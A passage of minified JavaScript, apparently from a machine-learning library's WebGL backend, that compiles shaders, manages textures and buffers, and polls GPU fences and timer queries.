            logicalShape: s.shape,
            texShape: s.texData.texShape,
            isUniform: !1,
            isPacked: s.texData.isPacked,
            flatOffset: null
        }
          , a = XV(o, i, t)
          , c = function fV(n, t) {
            const e = ds(n, (()=>n.createShader(n.FRAGMENT_SHADER)), "Unable to create fragment WebGLShader.");
            if (ot(n, (()=>n.shaderSource(e, t))),
            ot(n, (()=>n.compileShader(e))),
            z().get("ENGINE_COMPILE_ONLY"))
                return e;
            if (!1 === n.getShaderParameter(e, n.COMPILE_STATUS))
                throw i1(t, n.getShaderInfoLog(e)),
                new Error("Failed to compile fragment shader.");
            return e
        }(n.gl, a)
          , l = n.createProgram(c);
        return z().get("ENGINE_COMPILE_ONLY") ? {
            program: t,
            fragmentShader: c,
            source: a,
            webGLProgram: l,
            inShapeInfos: r,
            outShapeInfo: i,
            variablesLocations: null,
            customUniformLocations: null,
            infLoc: null,
            nanLoc: null,
            outShapeLocation: null,
            outShapeStridesLocation: null,
            outTexShapeLocation: null
        } : (n.buildVao(l),
        Object.assign({
            program: t,
            fragmentShader: c,
            source: a,
            webGLProgram: l,
            inShapeInfos: r,
            outShapeInfo: i
        }, f1(n, t, l)))
    }
    function f1(n, t, e) {
        const s = []
          , o = [];
        let r, i, a, c = null, l = null;
        l = n.getUniformLocation(e, "NAN", !1),
        1 === z().getNumber("WEBGL_VERSION") && (c = n.getUniformLocation(e, "INFINITY", !1));
        const u = !1;
        for (const d of t.variableNames) {
            const h = {
                name: d,
                uniform: n.getUniformLocation(e, d, u),
                offset: n.getUniformLocation(e, `offset${d}`, u)
            };
            t.enableShapeUniforms && (h.shape = n.getUniformLocation(e, `${d}Shape`, u),
            h.texShape = n.getUniformLocation(e, `${d}TexShape`, u)),
            s.push(h)
        }
        if (t.enableShapeUniforms && (r = n.getUniformLocation(e, "outShape", u),
        a = n.getUniformLocation(e, "outShapeStrides", u),
        i = n.getUniformLocation(e, "outTexShape", u)),
        t.customUniforms)
            for (const d of t.customUniforms)
                o.push(n.getUniformLocation(e, d.name, u));
        return {
            variablesLocations: s,
            customUniformLocations: o,
            infLoc: c,
            nanLoc: l,
            outShapeLocation: r,
            outShapeStridesLocation: a,
            outTexShapeLocation: i
        }
    }
    function m1(n, t) {
        if (n.length !== t.length)
            throw Error(`Binary was compiled with ${n.length} inputs, but was executed with ${t.length} inputs`);
        n.forEach(((e,s)=>{
            const o = e.logicalShape
              , r = t[s]
              , i = r.shape;
            if (!Rt(o, i))
                throw Error(`Binary was compiled with different shapes than the current args. Shapes ${o} and ${i} must match`);
            if (e.isUniform && r.isUniform)
                return;
            const a = e.texShape
              , c = r.isUniform ? null : r.texData.texShape;
            if (!Rt(a, c))
                throw Error(`Binary was compiled with different texture shapes than the current args. Shape ${a} and ${c} must match`)
        }
        ))
    }
    function Ne(n) {
        return z().getBool("WEBGL_USE_SHAPES_UNIFORMS") && n <= 4
    }
    class SF {
        constructor(t) {
            this.variableNames = ["A"],
            this.packedInputs = !1,
            this.packedOutput = !0,
            this.outPackingScheme = sa.DENSE,
            this.customUniforms = [{
                name: "texShape",
                type: "ivec2"
            }];
            const e = De();
            this.outputShape = t,
            this.enableShapeUniforms = Ne(this.outputShape.length),
            this.userCode = `\n      ivec3 outCoordsFromFlatIndex(int index) {\n        ${this.enableShapeUniforms ? Tl(["r", "c", "d"], t) : vo(["r", "c", "d"], t)}\n        return ivec3(r, c, d);\n      }\n\n      void main() {\n        ivec2 resTexRC = ivec2(resultUV.yx * vec2(texShape[0], texShape[1]));\n        int index = 4 * (resTexRC.x * texShape[1] + resTexRC.y);\n\n        vec4 result = vec4(0.);\n\n        for (int i=0; i<4; i++) {\n          int flatIndex = index + i;\n          ivec3 rc = outCoordsFromFlatIndex(flatIndex);\n          result[i] = getA(rc.x, rc.y, rc.z);\n        }\n\n        ${e.output} = result;\n      }\n    `
        }
    }
    class kF {
        constructor(t) {
            this.variableNames = ["A"],
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.outPackingScheme = sa.DENSE,
            this.customUniforms = [{
                name: "texShape",
                type: "ivec2"
            }];
            const e = De();
            this.outputShape = t,
            this.enableShapeUniforms = Ne(this.outputShape.length),
            this.userCode = `\n      ivec3 outCoordsFromFlatIndex(int index) {\n        ${this.enableShapeUniforms ? Tl(["r", "c", "d"], t) : vo(["r", "c", "d"], t)}\n        return ivec3(r, c, d);\n      }\n\n      void main() {\n        ivec2 resTexRC = ivec2(resultUV.yx * vec2(texShape[0], texShape[1]));\n        int index = 4 * (resTexRC.x * texShape[1] + resTexRC.y);\n\n        vec4 result = vec4(0.);\n\n        for (int i=0; i<4; i++) {\n          int flatIndex = index + i;\n          ivec3 rc = outCoordsFromFlatIndex(flatIndex);\n          result[i] = getChannel(getA(rc.x, rc.y, rc.z), vec2(rc.y, rc.z));\n        }\n\n        ${e.output} = result;\n      }\n    `
        }
    }
    class TF {
        constructor(t) {
            this.variableNames = ["A"],
            this.outTexUsage = an.DOWNLOAD;
            const e = De();
            this.outputShape = t,
            this.userCode = `\n      ${u1}\n\n      void main() {\n        float x = getAAtOutCoords();\n        ${e.output} = encode_float(x);\n      }\n    `
        }
    }
    class NF {
        constructor(t) {
            this.variableNames = ["A"],
            this.packedInputs = !0,
            this.packedOutput = !1,
            this.outTexUsage = an.DOWNLOAD;
            const e = De();
            this.outputShape = t,
            this.userCode = `\n      ${u1}\n\n      void main() {\n        ivec3 coords = getOutputCoords();\n        float x = getChannel(getAAtOutCoords(), vec2(coords.y, coords.z));\n        ${e.output} = encode_float(x);\n      }\n    `
        }
    }
    const RF = {
        R: 0,
        G: 1,
        B: 2,
        A: 3
    };
    class g1 {
        constructor(t, e=!1, s="RGBA") {
            this.variableNames = ["A"],
            this.customUniforms = [{
                name: "texShape",
                type: "ivec2"
            }];
            const o = De();
            this.outputShape = t,
            this.enableShapeUniforms = Ne(this.outputShape.length);
            let r = "result";
            e && (r = "floor(result * 255. + 0.5)");
            let i = "";
            for (let a = 0; a < s.length; a++) {
                const c = s[a];
                i += `\n          if(offset == ${a}) {\n            result = values[${RF[c]}];\n          }`
            }
            this.userCode = `\n      ${this.enableShapeUniforms ? "\n  int getFlatIndex(ivec3 coords) {\n    return coords.x * outShapeStrides[0] + coords.y * outShapeStrides[1] + coords.z;\n  }\n" : Tp(t)}\n\n      void main() {\n        ivec3 coords = getOutputCoords();\n        int flatIndex = getFlatIndex(coords);\n        float result = 0.;\n        int offset = imod(flatIndex, ${s.length});\n\n        flatIndex = idiv(flatIndex, ${s.length}, 1.);\n\n        int r = flatIndex / texShape[1];\n        if (r < texShape[0]) {\n          int c = imod(flatIndex, texShape[1]);\n          vec2 uv = (vec2(c, r) + halfCR) / vec2(texShape[1], texShape[0]);\n          vec4 values = ${o.texture2D}(A, uv);\n          ${i}\n        }\n        ${o.output} = vec4(${r}, 0., 0., 0.);\n      }\n    `
        }
    }
    class $F {
        constructor(t, e=!1) {
            this.variableNames = ["A"],
            this.packedInputs = !1,
            this.packedOutput = !0,
            this.customUniforms = [{
                name: "texShape",
                type: "ivec2"
            }];
            const s = De();
            this.outputShape = t,
            this.enableShapeUniforms = Ne(this.outputShape.length);
            let o = ""
              , r = "result";
            e && (r = "floor(result * 255. + 0.5)");
            for (let i = 0; i <= 1; i++)
                for (let a = 0; a <= 1; a++) {
                    const c = 2 * i + a;
                    o += `\n          localCoords = coords;\n          if(localCoords[2] + ${a} < ${this.enableShapeUniforms ? "outShape[2]" : `${t[2]}`}) {\n          localCoords[2] += ${a};\n          if (localCoords[1] + ${i} < ${this.enableShapeUniforms ? "outShape[1]" : `${t[1]}`}) {\n            localCoords[1] += ${i};\n\n            flatIndex = getFlatIndex(localCoords);\n            offset = imod(flatIndex, 4);\n\n            flatIndex = idiv(flatIndex, 4, 1.);\n\n            int r = flatIndex / texShape[1];\n            int c = imod(flatIndex, texShape[1]);\n            vec2 uv = (vec2(c, r) + halfCR) / vec2(texShape[1], texShape[0]);\n            values = ${s.texture2D}(A, uv);\n\n            if (offset == 0) {\n              result[${c}] = values[0];\n            } else if (offset == 1) {\n              result[${c}] = values[1];\n            } else if (offset == 2) {\n              result[${c}] = values[2];\n            } else {\n              result[${c}] = values[3];\n            }\n          }\n        }\n        `
                }
            this.userCode = `\n        ${this.enableShapeUniforms ? "\n  int getFlatIndex(ivec3 coords) {\n    return coords.x * outShapeStrides[0] + coords.y * outShapeStrides[1] + coords.z;\n  }\n" : Tp(t)}\n\n        void main() {\n          ivec3 coords = getOutputCoords();\n\n          vec4 result = vec4(0.);\n          int flatIndex, r, c, offset;\n          ivec3 localCoords;\n          vec2 uv;\n          vec4 values;\n\n          ${o}\n\n          ${s.output} = ${r};\n        }\n    `
        }
    }
    function GF(n) {
        const t = De();
        return function pV(n, t) {
            const e = ds(n, (()=>n.createShader(n.VERTEX_SHADER)), "Unable to create vertex WebGLShader.");
            if (ot(n, (()=>n.shaderSource(e, t))),
            ot(n, (()=>n.compileShader(e))),
            !1 === n.getShaderParameter(e, n.COMPILE_STATUS))
                throw console.log(n.getShaderInfoLog(e)),
                new Error("Failed to compile vertex shader.");
            return e
        }(n, `${t.version}\n    precision highp float;\n    ${t.attribute} vec3 clipSpacePos;\n    ${t.attribute} vec2 uv;\n    ${t.varyingVs} vec2 resultUV;\n\n    void main() {\n      gl_Position = vec4(clipSpacePos, 1);\n      resultUV = uv;\n    }`)
    }
    function LF(n) {
        return function xV(n, t) {
            const e = ds(n, (()=>n.createBuffer()), "Unable to create WebGLBuffer");
            return ot(n, (()=>n.bindBuffer(n.ARRAY_BUFFER, e))),
            ot(n, (()=>n.bufferData(n.ARRAY_BUFFER, t, n.STATIC_DRAW))),
            e
        }(n, new Float32Array([-1, 1, 0, 0, 1, -1, -1, 0, 0, 0, 1, 1, 0, 1, 1, 1, -1, 0, 1, 0]))
    }
    function EF(n) {
        return function yV(n, t) {
            const e = ds(n, (()=>n.createBuffer()), "Unable to create WebGLBuffer");
            return ot(n, (()=>n.bindBuffer(n.ELEMENT_ARRAY_BUFFER, e))),
            ot(n, (()=>n.bufferData(n.ELEMENT_ARRAY_BUFFER, t, n.STATIC_DRAW))),
            e
        }(n, new Uint16Array([0, 1, 2, 2, 1, 3]))
    }
    function ia(n, t, e, s, o, r) {
        !function wV(n, t) {
            const e = z().getNumber("WEBGL_MAX_TEXTURE_SIZE");
            if (n <= 0 || t <= 0)
                throw new Error(`Requested texture size [${n}x${t}] is invalid.`);
            if (n > e || t > e)
                throw new Error(`Requested texture size [${n}x${t}] greater than WebGL maximum on this browser / GPU [${e}x${e}].`)
        }(t, e);
        const i = function IV(n) {
            return ds(n, (()=>n.createTexture()), "Unable to create WebGLTexture.")
        }(n)
          , a = n.TEXTURE_2D;
        return ot(n, (()=>n.bindTexture(a, i))),
        ot(n, (()=>n.texParameteri(a, n.TEXTURE_WRAP_S, n.CLAMP_TO_EDGE))),
        ot(n, (()=>n.texParameteri(a, n.TEXTURE_WRAP_T, n.CLAMP_TO_EDGE))),
        ot(n, (()=>n.texParameteri(a, n.TEXTURE_MIN_FILTER, n.NEAREST))),
        ot(n, (()=>n.texParameteri(a, n.TEXTURE_MAG_FILTER, n.NEAREST))),
        1 === z().getNumber("WEBGL_VERSION") ? ot(n, (()=>n.texImage2D(a, 0, s, t, e, 0, o, r, null))) : ot(n, (()=>n.texStorage2D(a, 1, s, t, e))),
        ot(n, (()=>n.bindTexture(n.TEXTURE_2D, null))),
        {
            texture: i,
            texShape: [e, t]
        }
    }
    function b1(n) {
        return n.internalFormatFloat
    }
    function x1(n) {
        return n.internalFormatHalfFloat
    }
    function y1(n) {
        return n.downloadTextureFormat
    }
    function I1(n) {
        return n.internalFormatPackedFloat
    }
    function w1(n) {
        return n.internalFormatPackedHalfFloat
    }
    function ZF(n, t, e, s, o, r, i, a) {
        const c = n
          , l = new Float32Array(function aV(n, t) {
            const [e,s] = lr(n, t);
            return e * s * 4
        }(r, i));
        return c.bindBuffer(c.PIXEL_PACK_BUFFER, t),
        c.getBufferSubData(c.PIXEL_PACK_BUFFER, 0, l),
        c.bindBuffer(c.PIXEL_PACK_BUFFER, null),
        l
    }
    class $p {
        constructor(t) {
            this.outputTexture = null,
            this.program = null,
            this.disposed = !1,
            this.itemsToPoll = [];
            const e = z().getNumber("WEBGL_VERSION");
            if (null != t ? (this.gl = t,
            function sV(n, t) {
                Co[n] = t
            }(e, t)) : this.gl = Mn(e),
            t = this.gl,
            2 === z().getNumber("WEBGL_VERSION")) {
                const r = t;
                this.createVertexArray = ()=>ot(r, (()=>r.createVertexArray())),
                this.bindVertexArray = i=>ot(r, (()=>r.bindVertexArray(i))),
                this.deleteVertexArray = i=>ot(r, (()=>r.deleteVertexArray(i))),
                this.getVertexArray = ()=>ot(r, (()=>r.getParameter(r.VERTEX_ARRAY_BINDING)))
            } else if (null != t) {
                const r = t.getExtension("OES_vertex_array_object");
                if (null == r)
                    throw new Error("All WebGL1 implementations are expected to offer OES_vertex_array_object.");
                this.createVertexArray = ()=>ot(t, (()=>r.createVertexArrayOES())),
                this.bindVertexArray = i=>ot(t, (()=>r.bindVertexArrayOES(i))),
                this.deleteVertexArray = i=>ot(t, (()=>r.deleteVertexArrayOES(i))),
                this.getVertexArray = ()=>ot(t, (()=>t.getParameter(r.VERTEX_ARRAY_BINDING_OES)))
            }
            let s = "WEBGL_color_buffer_float";
            const o = "EXT_color_buffer_half_float";
            if (this.parallelCompilationExtension = this.gl.getExtension("KHR_parallel_shader_compile"),
            1 === z().getNumber("WEBGL_VERSION")) {
                const r = "OES_texture_float"
                  , i = "OES_texture_half_float";
                if (this.textureFloatExtension = wl(this.gl, r),
                wn(this.gl, i))
                    this.textureHalfFloatExtension = wl(this.gl, i);
                else if (z().get("WEBGL_FORCE_F16_TEXTURES"))
                    throw new Error("GL context does not support half float textures, yet the environment flag WEBGL_FORCE_F16_TEXTURES is set to true.");
                if (this.colorBufferFloatExtension = this.gl.getExtension(s),
                wn(this.gl, o))
                    this.colorBufferHalfFloatExtension = wl(this.gl, o);
                else if (z().get("WEBGL_FORCE_F16_TEXTURES"))
                    throw new Error("GL context does not support color renderable half floats, yet the environment flag WEBGL_FORCE_F16_TEXTURES is set to true.")
            } else if (s = "EXT_color_buffer_float",
            wn(this.gl, s))
                this.colorBufferFloatExtension = this.gl.getExtension(s);
            else {
                if (!wn(this.gl, o))
                    throw new Error("GL context does not support color renderable floats");
                this.colorBufferHalfFloatExtension = this.gl.getExtension(o)
            }
            this.vertexBuffer = LF(this.gl),
            this.indexBuffer = EF(this.gl),
            this.framebuffer = function CV(n) {
                return ds(n, (()=>n.createFramebuffer()), "Unable to create WebGLFramebuffer.")
            }(this.gl),
            this.textureConfig = Ip(this.gl, this.textureHalfFloatExtension)
        }
        get debug() {
            return z().getBool("DEBUG")
        }
        dispose() {
            if (this.disposed)
                return;
            null != this.program && console.warn("Disposing a GPGPUContext that still has a bound WebGLProgram. This is probably a resource leak, delete the program with GPGPUContext.deleteProgram before disposing."),
            null != this.outputTexture && console.warn("Disposing a GPGPUContext that still has a bound output matrix texture.  This is probably a resource leak, delete the output matrix texture with GPGPUContext.deleteMatrixTexture before disposing.");
            const t = this.gl;
            ot(t, (()=>t.finish())),
            ot(t, (()=>t.bindFramebuffer(t.FRAMEBUFFER, null))),
            ot(t, (()=>t.deleteFramebuffer(this.framebuffer))),
            ot(t, (()=>t.bindBuffer(t.ARRAY_BUFFER, null))),
            ot(t, (()=>t.bindBuffer(t.ELEMENT_ARRAY_BUFFER, null))),
            ot(t, (()=>t.deleteBuffer(this.indexBuffer))),
            this.disposed = !0
        }
        createFloat32MatrixTexture(t, e) {
            return this.throwIfDisposed(),
            function DF(n, t, e, s) {
                const [o,r] = oa(t, e);
                return ia(n, o, r, b1(s), s.textureFormatFloat, n.FLOAT)
            }(this.gl, t, e, this.textureConfig)
        }
        createFloat16MatrixTexture(t, e) {
            return this.throwIfDisposed(),
            function WF(n, t, e, s) {
                const [o,r] = oa(t, e);
                return ia(n, o, r, x1(s), s.textureFormatFloat, s.textureTypeHalfFloat)
            }(this.gl, t, e, this.textureConfig)
        }
        createUnsignedBytesMatrixTexture(t, e) {
            return this.throwIfDisposed(),
            function MF(n, t, e, s) {
                const [o,r] = oa(t, e);
                return ia(n, o, r, y1(s), n.RGBA, n.UNSIGNED_BYTE)
            }(this.gl, t, e, this.textureConfig)
        }
        uploadPixelDataToTexture(t, e) {
            this.throwIfDisposed(),
            function AF(n, t, e) {
                ot(n, (()=>n.bindTexture(n.TEXTURE_2D, t))),
                e.data instanceof Uint8Array ? 2 === z().getNumber("WEBGL_VERSION") ? ot(n, (()=>n.texSubImage2D(n.TEXTURE_2D, 0, 0, 0, e.width, e.height, n.RGBA, n.UNSIGNED_BYTE, e.data))) : ot(n, (()=>n.texImage2D(n.TEXTURE_2D, 0, n.RGBA, e.width, e.height, 0, n.RGBA, n.UNSIGNED_BYTE, e.data))) : 2 === z().getNumber("WEBGL_VERSION") ? ot(n, (()=>n.texSubImage2D(n.TEXTURE_2D, 0, 0, 0, n.RGBA, n.UNSIGNED_BYTE, e))) : ot(n, (()=>n.texImage2D(n.TEXTURE_2D, 0, n.RGBA, n.RGBA, n.UNSIGNED_BYTE, e))),
                ot(n, (()=>n.bindTexture(n.TEXTURE_2D, null)))
            }(this.gl, t, e)
        }
        uploadDenseMatrixToTexture(t, e, s, o) {
            this.throwIfDisposed(),
            function XF(n, t, e, s, o, r) {
                let i, a, c;
                ot(n, (()=>n.bindTexture(n.TEXTURE_2D, t))),
                o instanceof Uint8Array ? (i = new Uint8Array(e * s * 4),
                a = n.UNSIGNED_BYTE,
                c = n.RGBA) : (i = new Float32Array(e * s * 4),
                a = n.FLOAT,
                c = r.internalFormatPackedFloat),
                i.set(o),
                2 === z().getNumber("WEBGL_VERSION") ? ot(n, (()=>n.texSubImage2D(n.TEXTURE_2D, 0, 0, 0, e, s, n.RGBA, a, i))) : ot(n, (()=>n.texImage2D(n.TEXTURE_2D, 0, c, e, s, 0, n.RGBA, a, i))),
                ot(n, (()=>n.bindTexture(n.TEXTURE_2D, null)))
            }(this.gl, t, e, s, o, this.textureConfig)
        }
        createFloat16PackedMatrixTexture(t, e) {
            return this.throwIfDisposed(),
            function FF(n, t, e, s) {
                const [o,r] = lr(t, e);
                return ia(n, o, r, w1(s), n.RGBA, s.textureTypeHalfFloat)
            }(this.gl, t, e, this.textureConfig)
        }
        createPackedMatrixTexture(t, e) {
            return this.throwIfDisposed(),
            function VF(n, t, e, s) {
                const [o,r] = lr(t, e);
                return ia(n, o, r, I1(s), n.RGBA, n.FLOAT)
            }(this.gl, t, e, this.textureConfig)
        }
        deleteMatrixTexture(t) {
            this.throwIfDisposed(),
            this.outputTexture === t && (c1(this.gl, this.framebuffer),
            this.outputTexture = null),
            ot(this.gl, (()=>this.gl.deleteTexture(t)))
        }
        downloadByteEncodedFloatMatrixFromOutputTexture(t, e, s) {
            return this.downloadMatrixDriver(t, (()=>function KF(n, t, e, s) {
                const [o,r] = oa(t, e)
                  , a = new Uint8Array(function iV(n, t) {
                    return n * t
                }(t * e, 4));
                return ot(n, (()=>n.readPixels(0, 0, o, r, s.downloadTextureFormat, n.UNSIGNED_BYTE, a))),
                new Float32Array(a.buffer)
            }(this.gl, e, s, this.textureConfig)))
        }
        downloadPackedMatrixFromBuffer(t, e, s, o, r, i) {
            return ZF(this.gl, t, 0, 0, 0, r, i, this.textureConfig)
        }
        downloadFloat32MatrixFromBuffer(t, e) {
            return function OF(n, t, e) {
                const s = n
                  , o = new Float32Array(e);
                return s.bindBuffer(s.PIXEL_PACK_BUFFER, t),
                s.getBufferSubData(s.PIXEL_PACK_BUFFER, 0, o),
                s.bindBuffer(s.PIXEL_PACK_BUFFER, null),
                o
            }(this.gl, t, e)
        }
        createBufferFromTexture(t, e, s) {
            this.bindTextureToFrameBuffer(t);
            const o = function PF(n, t, e, s) {
                const o = n.createBuffer();
                ot(n, (()=>n.bindBuffer(n.PIXEL_PACK_BUFFER, o)));
                const a = 16 * t * e;
                return ot(n, (()=>n.bufferData(n.PIXEL_PACK_BUFFER, a, n.STREAM_READ))),
                ot(n, (()=>n.readPixels(0, 0, e, t, n.RGBA, n.FLOAT, 0))),
                ot(n, (()=>n.bindBuffer(n.PIXEL_PACK_BUFFER, null))),
                o
            }(this.gl, e, s, this.textureConfig);
            return this.unbindTextureToFrameBuffer(),
            o
        }
        createAndWaitForFence() {
            const t = this.createFence(this.gl);
            return this.pollFence(t)
        }
        createFence(t) {
            let e, s;
            if (z().getBool("WEBGL_FENCE_API_ENABLED")) {
                const o = t
                  , r = o.fenceSync(o.SYNC_GPU_COMMANDS_COMPLETE, 0);
                t.flush(),
                s = ()=>{
                    const i = o.clientWaitSync(r, 0, 0);
                    return i === o.ALREADY_SIGNALED || i === o.CONDITION_SATISFIED
                }
                ,
                e = r
            } else
                z().getNumber("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION") > 0 ? (e = this.beginQuery(),
                this.endQuery(),
                s = ()=>this.isQueryAvailable(e, z().getNumber("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION"))) : s = ()=>!0;
            return {
                query: e,
                isFencePassed: s
            }
        }
        downloadMatrixFromPackedTexture(t, e, s) {
            return this.downloadMatrixDriver(t, (()=>function BF(n, t, e) {
                const s = new Float32Array(t * e * 4);
                return ot(n, (()=>n.readPixels(0, 0, e, t, n.RGBA, n.FLOAT, s))),
                s
            }(this.gl, e, s)))
        }
        createProgram(t) {
            this.throwIfDisposed();
            const e = this.gl;
            null == this.vertexShader && (this.vertexShader = GF(e));
            const s = function gV(n) {
                return ds(n, (()=>n.createProgram()), "Unable to create WebGLProgram.")
            }(e);
            ot(e, (()=>e.attachShader(s, this.vertexShader))),
            ot(e, (()=>e.attachShader(s, t))),
            function bV(n, t) {
                if (ot(n, (()=>n.linkProgram(t))),
                !z().get("ENGINE_COMPILE_ONLY") && !1 === n.getProgramParameter(t, n.LINK_STATUS))
                    throw console.log(n.getProgramInfoLog(t)),
                    new Error("Failed to link vertex and fragment shaders.")
            }(e, s);
            const o = Object.assign(s, {
                vao: this.createVertexArray()
            });
            return this.debug && wp(e, o),
            o
        }
        buildVao(t) {
            this.setProgram(t),
            this.bindVertexArray(t.vao);
            const e = this.gl;
            ot(e, (()=>e.bindBuffer(e.ELEMENT_ARRAY_BUFFER, this.indexBuffer))),
            function zF(n, t, e) {
                return ot(n, (()=>n.bindBuffer(n.ARRAY_BUFFER, e))),
                a1(n, t, "clipSpacePos", e, 3, 20, 0) && a1(n, t, "uv", e, 2, 20, 12)
            }(e, t, this.vertexBuffer)
        }
        deleteProgram(t) {
            this.throwIfDisposed(),
            t === this.program && (this.program = null),
            null != t && (ot(this.gl, (()=>this.gl.deleteProgram(t))),
            this.deleteVertexArray(t.vao))
        }
        setProgram(t) {
            this.throwIfDisposed(),
            this.program = t,
            null != this.program && this.debug && wp(this.gl, this.program),
            ot(this.gl, (()=>this.gl.useProgram(t)))
        }
        getUniformLocation(t, e, s=!0) {
            return this.throwIfDisposed(),
            s ? function SV(n, t, e) {
                return ds(n, (()=>n.getUniformLocation(t, e)), 'uniform "' + e + '" not present in program.')
            }(this.gl, t, e) : function kV(n, t, e) {
                return n.getUniformLocation(t, e)
            }(this.gl, t, e)
        }
        getAttributeLocation(t, e) {
            return this.throwIfDisposed(),
            ot(this.gl, (()=>this.gl.getAttribLocation(t, e)))
        }
        getUniformLocationNoThrow(t, e) {
            return this.throwIfDisposed(),
            this.gl.getUniformLocation(t, e)
        }
        setInputMatrixTexture(t, e, s) {
            this.throwIfDisposed(),
            this.throwIfNoProgram(),
            function TV(n, t, e, s) {
                ot(n, (()=>vV(n, t, s))),
                ot(n, (()=>n.uniform1i(e, s)))
            }(this.gl, t, e, s)
        }
        setOutputMatrixTexture(t, e, s) {
            this.setOutputMatrixTextureDriver(t, s, e)
        }
        setOutputPackedMatrixTexture(t, e, s) {
            this.throwIfDisposed();
            const [o,r] = lr(e, s);
            this.setOutputMatrixTextureDriver(t, o, r)
        }
        setOutputMatrixWriteRegion(t, e, s, o) {
            this.setOutputMatrixWriteRegionDriver(s, t, o, e)
        }
        setOutputPackedMatrixWriteRegion(t, e, s, o) {
            throw new Error("setOutputPackedMatrixWriteRegion not implemented.")
        }
        debugValidate() {
            null != this.program && wp(this.gl, this.program),
            Cl(this.gl)
        }
        executeProgram() {
            this.throwIfDisposed(),
            this.throwIfNoProgram();
            const t = this.gl;
            if (this.debug) {
                const e = this.getVertexArray();
                console.assert(e === this.program.vao, "VAO changed between setProgram and executeProgram!"),
                this.debugValidate()
            }
            ot(t, (()=>t.drawElements(t.TRIANGLES, 6, t.UNSIGNED_SHORT, 0)))
        }
        blockUntilAllProgramsCompleted() {
            this.throwIfDisposed(),
            ot(this.gl, (()=>this.gl.finish()))
        }
        getQueryTimerExtension() {
            return null == this.disjointQueryTimerExtension && (this.disjointQueryTimerExtension = wl(this.gl, 2 === z().getNumber("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION") ? "EXT_disjoint_timer_query_webgl2" : "EXT_disjoint_timer_query")),
            this.disjointQueryTimerExtension
        }
        getQueryTimerExtensionWebGL2() {
            return this.getQueryTimerExtension()
        }
        getQueryTimerExtensionWebGL1() {
            return this.getQueryTimerExtension()
        }
        beginQuery() {
            if (2 === z().getNumber("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION")) {
                const s = this.gl
                  , o = this.getQueryTimerExtensionWebGL2()
                  , r = s.createQuery();
                return s.beginQuery(o.TIME_ELAPSED_EXT, r),
                r
            }
            const t = this.getQueryTimerExtensionWebGL1()
              , e = t.createQueryEXT();
            return t.beginQueryEXT(t.TIME_ELAPSED_EXT, e),
            e
        }
        endQuery() {
            if (2 === z().getNumber("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION")) {
                const e = this.gl
                  , s = this.getQueryTimerExtensionWebGL2();
                return void e.endQuery(s.TIME_ELAPSED_EXT)
            }
            const t = this.getQueryTimerExtensionWebGL1();
            t.endQueryEXT(t.TIME_ELAPSED_EXT)
        }
        async waitForQueryAndGetTime(t) {
            return await uf((()=>this.disposed || this.isQueryAvailable(t, z().getNumber("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION")))),
            this.getQueryTime(t, z().getNumber("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION"))
        }
        getQueryTime(t, e) {
            if (0 === e)
                return null;
            if (2 === e) {
                const s = this.gl;
                return s.getQueryParameter(t, s.QUERY_RESULT) / 1e6
            }
            {
                const s = this.getQueryTimerExtensionWebGL1();
                return s.getQueryObjectEXT(t, s.QUERY_RESULT_EXT) / 1e6
            }
        }
        isQueryAvailable(t, e) {
            if (0 === e)
                return !0;
            if (2 === e) {
                const s = this.gl
                  , o = this.getQueryTimerExtensionWebGL2()
                  , r = s.getQueryParameter(t, s.QUERY_RESULT_AVAILABLE);
                return null == this.disjoint && (this.disjoint = this.gl.getParameter(o.GPU_DISJOINT_EXT)),
                r && !this.disjoint
            }
            {
                const s = this.getQueryTimerExtensionWebGL1()
                  , o = s.getQueryObjectEXT(t, s.QUERY_RESULT_AVAILABLE_EXT);
                return null == this.disjoint && (this.disjoint = this.gl.getParameter(s.GPU_DISJOINT_EXT)),
                o && !this.disjoint
            }
        }
        pollFence(t) {
            return new Promise((e=>{
                this.addItemToPoll((()=>t.isFencePassed()), (()=>e()))
            }
            ))
        }
        pollItems() {
            const t = function HF(n) {
                let t = 0;
                for (; t < n.length && n[t](); ++t)
                    ;
                return t - 1
            }(this.itemsToPoll.map((e=>e.isDoneFn)));
            for (let e = 0; e <= t; ++e) {
                const {resolveFn: s} = this.itemsToPoll[e];
                s()
            }
            this.itemsToPoll = this.itemsToPoll.slice(t + 1)
        }
        addItemToPoll(t, e) {
            if (this.itemsToPoll.push({
                isDoneFn: t,
                resolveFn: e
            }),
            this.itemsToPoll.length > 1)
                return;
            let s;
            "setTimeoutCustom"in z().platform && (s = z().platform.setTimeoutCustom.bind(z().platform)),
            uf((()=>(this.pollItems(),
            0 === this.itemsToPoll.length)), (()=>0), null, s)
        }
        bindTextureToFrameBuffer(t) {
            this.throwIfDisposed(),
            Cp(this.gl, t, this.framebuffer),
            this.debug && Cl(this.gl)
        }
        unbindTextureToFrameBuffer() {
            null != this.outputTexture ? (Cp(this.gl, this.outputTexture, this.framebuffer),
            this.debug && Cl(this.gl)) : c1(this.gl, this.framebuffer)
        }
        downloadMatrixDriver(t, e) {
            this.bindTextureToFrameBuffer(t);
            const s = e();
            return this.unbindTextureToFrameBuffer(),
            s
        }
        setOutputMatrixTextureDriver(t, e, s) {
            this.throwIfDisposed();
            const o = this.gl;
            Cp(o, t, this.framebuffer),
            this.debug && Cl(o),
            this.outputTexture = t,
            ot(o, (()=>o.viewport(0, 0, e, s))),
            ot(o, (()=>o.scissor(0, 0, e, s)))
        }
        setOutputMatrixWriteRegionDriver(t, e, s, o) {
            this.throwIfDisposed(),
            ot(this.gl, (()=>this.gl.scissor(t, e, s, o)))
        }
        throwIfDisposed() {
            if (this.disposed)
                throw new Error("Attempted to use disposed GPGPUContext.")
        }
        throwIfNoProgram() {
            if (null == this.program)
                throw new Error("No GPU program is currently set.")
        }
    }
